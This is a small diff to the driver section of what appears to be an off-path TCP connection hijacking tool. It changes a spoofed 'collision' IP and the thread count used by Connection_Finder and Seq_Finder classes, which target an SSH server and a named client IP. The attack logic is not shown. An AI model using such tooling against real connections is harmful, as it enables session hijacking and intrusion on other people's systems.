@@ -15,10 +15,10 @@ if __name__ == '__main__':
     server_port = 22
 
     client_ip = '182.92.129.182'
+    collision_ip = '10.10.5.12'
 
     attack_bind_if = 'eth0'
     own_ip_prefix = '10.10.0.0'
-    collision_ip = '10.10.8.150'
 
     connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                                    server_port=server_port, block_size=500, num_thread=2, bind_if_name=attack_bind_if)
@@ -32,7 +32,7 @@ if __name__ == '__main__':
     time.sleep(3)
     seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                      server_port=server_port, client_port=client_port,
-                     bind_ifname=attack_bind_if, chunk_size=500, num_thread=2, verbose=True)
+                     bind_ifname=attack_bind_if, chunk_size=500, num_thread=3, verbose=True)
     seq.run()
     seq_in_win = seq.result
 
